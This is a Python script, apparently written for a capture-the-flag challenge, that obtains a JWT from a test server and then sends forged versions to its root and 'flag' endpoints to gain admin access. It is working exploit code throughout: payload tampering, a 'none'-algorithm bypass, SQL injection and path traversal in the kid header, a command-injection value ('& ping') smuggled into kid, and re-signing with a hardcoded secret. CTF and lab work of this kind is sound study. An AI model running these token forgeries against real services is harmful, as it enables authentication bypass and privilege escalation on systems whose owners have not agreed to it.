import base64
import hmac
import hashlib
import json
import requests


SERVER_URL = "http://100.109.132.8:11000"
USER_ID = '7'
USER_PW = "7"

def http_post(endpoint, data):
    response = requests.post(f"{SERVER_URL}/{endpoint}", data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(f"POST {SERVER_URL}/{endpoint} status={response.status_code} text={response.text}")
    return response

def register_user():
    http_post("regist", {"id": USER_ID, "pw": USER_PW, "is_admin": True})

def authenticate_user():
    return http_post("auth", {"id": USER_ID, "pw": USER_PW, "is_admin": True}).json().get("token")

def http_get(token, endpoint):
    response = requests.get(f"{SERVER_URL}/{endpoint}", headers={"X-Token": token})
    print(f"GET {SERVER_URL}/{endpoint} status={response.status_code} text={response.text}")
    return response.text

def create_jwt_token_with_signature(jwt_header_base64: str, jwt_payload_base64: str, signature_key: str):
    signature = hmac.new(signature_key.encode(),  f"{jwt_header_base64}.{jwt_payload_base64}".encode(), hashlib.sha256).digest()
    signature_base64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    return f"{jwt_header_base64}.{jwt_payload_base64}.{signature_base64}"

def print_attempt_divider():
    print("####################################################################################################")

def token_reconstructed(jwt_token):
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
    original_payload = jwt_token.split('.')[1]
    payload = modify_payload(original_payload, lambda x: x.update({"is_admin": False}))
    signature = jwt_token.split('.')[2]
    new_jwt_token = f"{header}.{payload}.{signature}"
    return new_jwt_token

def modify_payload(payload_base64: str, fn):
    decoded_payload = base64.urlsafe_b64decode(payload_base64 + "==").decode()
    payload_data = json.loads(decoded_payload)
    fn(payload_data)
    marshaled_payload = json.dumps(payload_data, separators=(',', ':'))
    payload_base64 = base64.urlsafe_b64encode(marshaled_payload.encode()).decode().rstrip('=')
    return payload_base64


def inject_admin(original_payload_base64: str):
    return modify_payload(original_payload_base64, lambda x: x.update({"is_admin": True}))

def token_dumb(jwt_token):
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
    original_payload = jwt_token.split('.')[1]
    payload_base64 = inject_admin(original_payload)
    signature = jwt_token.split('.')[2]
    new_jwt_token = f"{header}.{payload_base64}.{signature}"
    return new_jwt_token

def token_original(jwt_token):
    return jwt_token

def token_none_alg(jwt_token):
    header = base64.urlsafe_b64encode(b'{"alg":"NonE","typ":"JWT"}').decode().rstrip('=')
    payload = inject_admin(jwt_token.split('.')[1])
    signature = ""
    new_jwt_token = f"{header}.{payload}.{signature}"
    return new_jwt_token

def token_sql_injection(jwt_token):
    new_header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT","kid":"xxxx\' UNION SELECT \'aaa"}').decode().rstrip('=')
    new_jwt_token = create_jwt_token_with_signature(new_header, inject_admin(jwt_token.split('.')[1]), "aaa")
    return new_jwt_token
def token_ping(jwt_token):
    new_header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null & ping -c 20 localhost"}').decode().rstrip('=')
    new_jwt_token = create_jwt_token_with_signature(new_header, inject_admin(jwt_token.split('.')[1]), "aaa")
    return new_jwt_token
def token_dev_null(jwt_token):
    new_header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT","kid":"../../../../../../../../../../../../../dev/null"}').decode().rstrip('=')
    new_jwt_token = create_jwt_token_with_signature(new_header, inject_admin(jwt_token.split('.')[1]), "")
    return new_jwt_token

def token_change_issuer(jwt_token):
    return create_jwt_token_with_signature(jwt_token.split('.')[0], modify_payload(jwt_token.split('.')[1], lambda x: x.update({"is_admin":True,"iss":"a"})), "PuZc15GXkfmyO3IjGdB6rtwEz8riLlkb")

def break_token(jwt_token):
    header = base64.urlsafe_b64decode(jwt_token.split('.')[0] + "==").decode()
    payload = base64.urlsafe_b64decode(jwt_token.split('.')[1] + "==").decode()
    signature = jwt_token.split('.')[2]
    return header, payload, signature



# Main execution
register_user()
jwt_token = authenticate_user()
header, payload, signature = break_token(jwt_token)
print("header:")
print(header)
print("payload:")
print(payload)
print("signature:")

with open("jwt_token.txt", "w") as file:
    file.write(jwt_token)


for token_fn in [
    token_original,
    token_reconstructed,
    token_dumb,
    token_sql_injection,
    token_dev_null,
    token_none_alg,
    token_change_issuer,
    token_ping
]:
    new_jwt_token = token_fn(jwt_token)
    print_attempt_divider()
    print(f"Attempting with {token_fn.__name__}")
    print("new_jwt_token:")
    print(new_jwt_token)
    header, payload, signature = break_token(new_jwt_token)
    print("header:")
    print(header)
    print("payload:")   
    print(payload)
    print("signature:")
    print(signature)
    print("root endpoint:")
    http_get(new_jwt_token, "")
    print("flag endpoint:")
    http_get(new_jwt_token, "flag")

